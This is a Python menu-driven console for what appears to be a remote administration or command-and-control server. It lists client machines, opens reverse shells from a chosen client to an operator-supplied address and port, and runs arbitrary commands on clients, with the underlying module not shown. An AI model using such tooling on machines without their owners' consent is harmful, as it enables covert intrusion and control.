#!/usr/bin/python3
from front import admin


stayInProgram=True
res=False
commands = ['help','listClients','popShell','runComand', 'testServer', 'testClient','exit']

exit = len(commands) - 1

master=admin()

while stayInProgram :
    wait = True
    print (
        "List of commands:" + "\n\n" +
        "0 - help" + "\n" +
        "1 - listClients" +  "\n" +
        "2 - popShell"  + "\n" +
        "3 - runComand"  + "\n" +
        "4 - testServer"  + "\n" +
        "5 - testClient"  + "\n" +
        "6 - exit"  + "\n"
    )
    command = exit;

    try : 
        command = int(input('Enter the number of command:'))
        if (command<0) or (command>exit):
            raise command
    except:
        print("The input is not validated\n")
        command = exit


    print ("The command selected is: " + commands[command])

    if (command == 0): #help
        print (
        "\n\nThe program is an administrator of several computers that act as clients of the server where that program is run."  + "\n\n" +
        "0 - help: describe the program and the commands of program " "\n\n" +
        "1 - listClients: list full clients." + "\n\n" + 
        "2 - popShell: runs a reverse shell." + "\n\n" + 
        "3 - runComand: run a command on the client machine."  + "\n\n" +
        "4 - testServer: tests the connection to the server."  + "\n\n" +
        "5 - testClient: tests the connection on the client machine."  + "\n\n" +
        "6 - exit: disconnects of the server."  + "\n"
    )

    elif (command == 1): #listClients
        try:
            if not (master.displayClients()):
               raise Exception("Não achado\n")
        except:
            print("Returned Error!!")

    
    elif (command == 2): #popShell
        try:
            if not (master.displayClients()):
                raise Exception("Não achado\n")

            client = int(input("What client?"))
            print("\n")
            addres = input("what address?")
            print("\n")
            port = int(input("What port?"))
            print("\n")

            if not (master.abrirShell(client,addres,port)):
                raise Exception("Não achado\n")
        except:
            print("Returned Error!!")


    elif (command == 3): #runComand
        try:
            if not (master.displayClients()):
                raise Exception("Não achado\n")
            
            client = int(input("What client?"))
            print("\n")
            comd = input("what command?")
            print("\n")

            if not (master.runCommand(comd,client)):
                raise Exception("Não achado\n")
        except:
            print("Returned Error!!")
    
    elif (command == 4): #testServer
        try:
            if not(master.testServer()):
                raise Exception("Não achado\n")
        except:
            print("Returned Error!!")
    
    elif (command == 5): #testClient
        try:
            if not (master.displayClients()):
                raise Exception("Não achado\n")
            
            client = int(input("What client?"))
            print("\n")

            if not(master.testClient(client)):
                raise Exception("Não achado\n")
        except:
            print("Returned Error!!")

    elif (command == exit): #exit
        stayInProgram = False
        wait = False
    
    else : #comando não descrito, nao deveria acontecer
        stayInProgram = False
        wait = False

    if (wait):
        input("\nPress enter for the next command")
        wait = False
    else:
        print("Finish the program")

#{listClients:ok,popShell:ok,execProgram:no,runComand:ok,testServer:ok,testeClient:ok}
#lC:ok,pS:ok,eP:n,rC:ok,tS:ok,tC:ok

#falta apenas senha para o adm e enviar e receber arquivos